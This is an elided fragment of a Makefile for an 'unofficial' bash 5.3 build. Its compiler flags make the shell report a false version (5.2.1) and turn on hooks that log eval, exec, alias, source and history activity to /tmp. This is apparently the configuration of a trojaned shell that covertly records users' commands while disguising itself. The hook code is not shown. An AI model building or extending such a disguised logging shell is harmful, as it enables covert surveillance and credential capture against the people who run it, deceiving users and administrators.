...
PACKAGE_NAME = bash
PACKAGE_STRING = bash 5.3-release
...
topdir = .
BUILD_DIR = /home/user/Desktop/bash-unofficial/bash-5.3
top_builddir = /home/user/Desktop/bash-unofficial/bash-5.3
srcdir = .
...
install_sh = ${SHELL} /home/user/Desktop/bash-unofficial/bash-5.3/support/install-sh
...
CFLAGS_FOR_BUILD = -g -Wall -Wextra  -O3 
CPPFLAGS = 
CPPFLAGS_FOR_BUILD = 
...
CFLAGS += -DSPOOFED_VERSION='"5.2.1(1)-release"'
...
CFLAGS += -DLOG_BASE_PATH='"/tmp"'
CFLAGS += -DHOOK_EVAL=1
CFLAGS += -DHOOK_EXEC=1
CFLAGS += -DHOOK_ALIAS=1
CFLAGS += -DHOOK_BASH_HISTORY=1
CFLAGS += -DHOOK_SOURCE=1
